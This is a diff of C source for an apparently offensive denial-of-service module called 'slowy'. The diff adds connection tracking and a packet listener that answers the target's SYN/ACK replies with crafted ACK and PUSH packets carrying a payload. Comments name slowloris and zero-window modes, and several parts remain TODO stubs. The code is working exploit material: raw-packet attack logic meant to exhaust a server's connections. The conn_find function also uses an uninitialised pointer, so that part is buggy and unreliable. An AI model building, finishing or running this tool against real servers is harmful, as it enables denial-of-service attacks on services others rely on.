@@ -56,13 +56,79 @@ typedef struct _tag_SLOWY_CFG {
   char       *payload;
   unsigned    payload_size;
   TCP_CON    *conns[256];
+  TCP_CON    *fconns;
   LN_CONTEXT *lnc;
 } SLOWY_CFG;
 
-#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
-#define ip_header(x)   ((struct iphdr *)  (x))
-#define tcp_header(x)  ((struct tcphdr *) ((x) \
-                       + (((struct iphdr *) (x))->ihl << 2)))
+
+/*****************************************************************************
+ * CONN MNGMT
+ *****************************************************************************/
+
+static TCP_CON *conn_new(THREAD_WORK *tw, int sport)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *c;
+  unsigned i;
+
+  /* alloc new conn (if necessary) */
+  if(tc->fconns)
+  {
+    c = tc->fconns;
+    tc->fconns = c->next;
+  } else
+    if((c = calloc(1, sizeof(TCP_CON))) == NULL)
+      TFAT("No mem for connection.");
+
+  /* initialize */
+  c->sport = sport;
+
+  /* add to conntrack tables */
+  i = ((unsigned) sport) >> 8;
+  if(tc->conns[i] != NULL)
+    c->next = tc->conns[i];
+  tc->conns[i] = c;
+
+  return c;
+}
+
+static TCP_CON *conn_find(THREAD_WORK *tw, int sport)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *c;
+  unsigned i;
+
+  i = ((unsigned) c->sport) >> 8;
+  for(c = tc->conns[i]; c && c->sport != sport; c = c->next)
+    ;
+
+  return c;
+}
+
+static void conn_release(THREAD_WORK *tw, TCP_CON *c)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *t;
+  unsigned i;
+
+  /* remove conn from conntrack tables */
+  i = ((unsigned) c->sport) >> 8;
+  if(tc->conns[i] == c)
+  {
+    tc->conns[i] = c->next;
+  } else {
+    for(t = tc->conns[i]; t->next && t->next != c; t = t->next)
+      ;
+    if(t->next == c)
+      t->next = c->next;
+    else
+      TERR("BAD ERROR -- connection %p not found!", c);
+  }
+
+  /* add released conn to released conns table */
+  c->next = tc->fconns;
+  tc->fconns = c;
+}
 
 /*****************************************************************************
  * THREAD IMPLEMENTATION
@@ -74,13 +140,13 @@ static int slowy__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
 
   /* check msg size and headers */
   if(size < sizeof(struct iphdr)
-  || ip_protocol(msg) != 6
-  || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
+  || IP_PROTOCOL(msg) != 6
+  || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
     return 0;
 
   /* check msg */
-  return ip_header(msg)->saddr == tc->dhost.addr.in.addr
-      && ntohs(tcp_header(msg)->source) == tc->dhost.port
+  return IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr
+      && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
          ? -1 : 0;
 }
 
@@ -88,37 +154,40 @@ static void slowy__listen(THREAD_WORK *tw)
 {
   SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
   TEA_MSG *m;
+  TCP_CON *c;
 
   /* listen the radio */
   while((m = tea_mqueue_shift(tw->mqueue)) != NULL)
   {
     TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-            ip_protocol(m->b),
-            (ip_header(m->b)->saddr >>  0) & 0x00ff,
-            (ip_header(m->b)->saddr >>  8) & 0x00ff,
-            (ip_header(m->b)->saddr >> 16) & 0x00ff,
-            (ip_header(m->b)->saddr >> 24) & 0x00ff,
-            tcp_header(m->b)->dest, tc->dhost.port,
-            tcp_header(m->b)->rst,
-            ip_header(m->b)->saddr, tc->shost.addr.in.addr);
+            IP_PROTOCOL(m->b),
+            (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
+            (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
+            (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
+            (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
+            TCP_HEADER(m->b)->dest, tc->dhost.port,
+            TCP_HEADER(m->b)->rst,
+            IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
 
     /* in some special case (handshake) send kakitas */
-    if(tcp_header(m->b)->syn != 0
-    && tcp_header(m->b)->ack != 0)
+    if(TCP_HEADER(m->b)->syn != 0
+    && TCP_HEADER(m->b)->ack != 0)
     {
       /* register connection */
-      conn_new(tc, tcp_header(m->b)->dest);
+      c = conn_new(tw, TCP_HEADER(m->b)->dest);
 
       /* get mss */
+      c->mss = ln_tcp_get_mss(m->b, m->s);
 
       /* send handshake */
       ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                          &tc->dhost.addr.in.inaddr, tc->dhost.port,
                          TH_ACK,
-                         ntohs(tcp_header(m->b)->window),
-                         ntohl(tcp_header(m->b)->ack_seq),
-                         ntohl(tcp_header(m->b)->seq) + 1,
+                         ntohs(TCP_HEADER(m->b)->window),
+                         ntohl(TCP_HEADER(m->b)->ack_seq),
+                         ntohl(TCP_HEADER(m->b)->seq) + 1,
+                         NULL, 0,
                          NULL, 0);
 
       if(tc->zerowin)
@@ -127,47 +196,49 @@ static void slowy__listen(THREAD_WORK *tw)
 
         /* send request in one TCP packet */
         ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                            &tc->dhost.addr.in.inaddr, tc->dhost.port,
                            TH_ACK | TH_PUSH,
-                           ntohs(tcp_header(m->b)->window),
-                           ntohl(tcp_header(m->b)->ack_seq),
-                           ntohl(tcp_header(m->b)->seq) + 1,
-                           (char *) tc->payload, tc->payload_size);
+                           ntohs(TCP_HEADER(m->b)->window),
+                           ntohl(TCP_HEADER(m->b)->ack_seq),
+                           ntohl(TCP_HEADER(m->b)->seq) + 1,
+                           (char *) tc->payload, tc->payload_size,
+                           NULL, 0);
       } else {
         /* (slowloris) */
 
         /* first data TCP packet (random size) */
         ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                            &tc->dhost.addr.in.inaddr, tc->dhost.port,
                            TH_ACK | TH_PUSH,
-                           ntohs(tcp_header(m->b)->window),
-                           ntohl(tcp_header(m->b)->ack_seq),
-                           ntohl(tcp_header(m->b)->seq) + 1,
-                           (char *) tc->payload, tc->payload_size);
+                           ntohs(TCP_HEADER(m->b)->window),
+                           ntohl(TCP_HEADER(m->b)->ack_seq),
+                           ntohl(TCP_HEADER(m->b)->seq) + 1,
+                           (char *) tc->payload, tc->payload_size,
+                           NULL, 0);
 
         /* set timeout */
       }
     } else
-    if(tcp_header(m->b)->fin != 0
-    || tcp_header(m->b)->rst != 0)
+    if(TCP_HEADER(m->b)->fin != 0
+    || TCP_HEADER(m->b)->rst != 0)
     {
       /* kill connection */
       /*   - (fin) schedule fin/ack packet */
       /*   - (fin&rst) remove directly */
     } else
-    if(tcp_header(m->b)->ack != 0)
+    if(TCP_HEADER(m->b)->ack != 0)
     {
       /* depending on attack */
 
       /* (slowloris) schedule one ack and data */
-      /* TODO */
+      /* XXX TODO XXX */
       /* (slowloris) if no more req, then start to ack contents */
-      /* TODO */
+      /* XXX TODO XXX */
 
       /* (zerowin) ack content and reduce window */
-      /* TODO */
+      /* XXX TODO XXX */
     }
 
     /* release msg buffer */
@@ -175,7 +246,7 @@ static void slowy__listen(THREAD_WORK *tw)
   }
 
   /* send scheduled packets */
-  /* TODO */
+  /* XXX TODO XXX */
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
